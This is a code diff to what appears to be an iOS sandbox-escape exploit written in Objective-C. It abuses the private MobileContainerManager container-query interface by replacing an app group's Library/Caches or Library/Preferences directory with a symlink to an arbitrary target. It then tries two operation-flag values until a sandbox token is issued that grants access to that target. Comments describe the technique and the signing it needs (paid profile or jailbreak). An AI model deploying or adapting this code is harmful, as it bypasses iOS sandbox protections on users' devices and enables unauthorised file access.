@@ -61,6 +61,9 @@ typedef struct {
 } p160_mcm;
 
 static p160_mcm g;
+/* Container-query operation flags. Bench27 measured that 27.0.1 refuses the
+   26.x value 0x800000000 and issues a token for 0x8000000000; p160 tries both. */
+static uint64_t g_p160_flags = P160_FLAGS;
 
 static void *p160_sym(void *h, const char *a, const char *b) {
     void *p = dlsym(h, a);
@@ -114,7 +117,7 @@ static int64_t p160_query(uint64_t cls, const char *ident, BOOL group,
     else if (!group && g.set_ids) g.set_ids(q, x);
     if (g.set_part) g.set_part(q, part);
     if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
-    if (g.set_flags) g.set_flags(q, P160_FLAGS);
+    if (g.set_flags) g.set_flags(q, g_p160_flags);
     if (x && g.xpc_rel) g.xpc_rel(x);
 
     void *res = g.get_one(q);
@@ -190,11 +193,6 @@ static void p160_recover_library(NSMutableString *o) {
     }
 }
 
-/* Class-7 app-group path. Needs a real provisioned app group: the app must be
-   signed with com.apple.security.application-groups containing the ID and the
-   profile must carry it. Free Sideloadly profiles cannot; a paid profile or a
-   jailbroken ldid sign can. Candidate IDs come from Documents/p160_group.txt
-   (one per line) plus a guess of group.<bundle-id>. */
 static NSArray<NSString *> *p160_group_candidates(void) {
     NSMutableArray *ids = [NSMutableArray array];
     NSString *docs = NSSearchPathForDirectoriesInDomains(
@@ -218,6 +216,27 @@ static NSArray<NSString *> *p160_group_candidates(void) {
     return ids;
 }
 
+/* Class-7 app-group path, Bench27's proven shape (iOS 27.0.1, and the same
+   technique as worse_query): the token is minted for the group's
+   Library/<part> path itself, and that path is a symlink we control. The
+   kernel resolves the link when the token is consumed, so the grant lands on
+   the target. A leaf symlink inside Caches is not enough — the daemon grants
+   the part directory, not its children.
+
+   Requires a real provisioned app group: the app must be signed with
+   com.apple.security.application-groups containing the ID and the profile must
+   carry it. Free Sideloadly profiles cannot; a paid profile or a jailbroken
+   ldid sign can. Candidate IDs come from Documents/p160_group.txt (one per
+   line) plus a guess of group.<bundle-id>. */
+static void p160_restore_part(NSString *path, BOOL wasDir) {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:path error:nil];
+    if (wasDir) {
+        [fm createDirectoryAtPath:path withIntermediateDirectories:NO
+                        attributes:nil error:nil];
+    }
+}
+
 static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **errOut) {
     if (!p160_load() || !g.set_ids) { if (errOut) *errOut = @"MCM unavailable"; return -1; }
     NSFileManager *fm = [NSFileManager defaultManager];
@@ -225,32 +244,46 @@ static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **
     for (NSString *gid in p160_group_candidates()) {
         NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
         if (!u) continue;
-        NSString *caches = [[u.path stringByAppendingPathComponent:@"Library"]
-                            stringByAppendingPathComponent:@"Caches"];
-        [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
-        NSString *leaf = [NSString stringWithFormat:@".p160_g%d", getpid()];
-        NSString *link = [caches stringByAppendingPathComponent:leaf];
-        [fm removeItemAtPath:link error:nil];
-        int64_t result = -1;
-        if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) == 0) {
-            for (NSString *dom in @[leaf,
-                                    [@"Caches/" stringByAppendingString:leaf],
-                                    [@"Library/Caches/" stringByAppendingString:leaf]]) {
-                NSString *path = nil, *err = nil;
-                int64_t h = p160_query(7, gid.UTF8String, YES, 3, dom, @"class7", &path, &err);
-                if (h >= 0) {
-                    if (p160_can_open(target, YES)) {
-                        result = h; if (pathOut) *pathOut = path; break;
-                    }
-                    if (g.release) g.release(h);
-                }
-                if (err.length) last = err;
+        NSString *lib = [u.path stringByAppendingPathComponent:@"Library"];
+        /* part 3 = Library/Caches, part 2 = Library/Preferences (both work). */
+        for (NSNumber *partNum in @[@3, @2]) {
+            uint64_t part = partNum.unsignedLongLongValue;
+            NSString *leaf = part == 3 ? @"Caches" : @"Preferences";
+            NSString *partPath = [lib stringByAppendingPathComponent:leaf];
+            BOOL wasDir = [fm fileExistsAtPath:partPath];
+            [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+            if (!wasDir) {
+                [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                                attributes:nil error:nil];
+                wasDir = YES;
             }
-        } else {
-            last = [NSString stringWithFormat:@"symlink in group %@ failed", gid];
+            [fm removeItemAtPath:partPath error:nil];
+            int64_t result = -1;
+            if (symlink(target.fileSystemRepresentation,
+                        partPath.fileSystemRepresentation) == 0) {
+                for (NSNumber *flagNum in @[@(UINT64_C(0x8000000000)), @(P160_FLAGS)]) {
+                    g_p160_flags = flagNum.unsignedLongLongValue;
+                    NSString *path = nil, *err = nil;
+                    int64_t h = p160_query(7, gid.UTF8String, YES, part,
+                                           @"", @"class7", &path, &err);
+                    if (h >= 0) {
+                        if (p160_can_open(target, YES)) {
+                            result = h; if (pathOut) *pathOut = path;
+                            g_p160_flags = P160_FLAGS;
+                            p160_restore_part(partPath, wasDir);
+                            if (errOut) *errOut = nil;
+                            return result;
+                        }
+                        if (g.release) g.release(h);
+                    }
+                    if (err.length) last = err;
+                }
+            } else {
+                last = [NSString stringWithFormat:@"symlink %@/Library/%@ failed", gid, leaf];
+            }
+            g_p160_flags = P160_FLAGS;
+            p160_restore_part(partPath, wasDir);
         }
-        [fm removeItemAtPath:link error:nil];
-        if (result >= 0) { if (errOut) *errOut = nil; return result; }
     }
     if (errOut) *errOut = last;
     return -1;
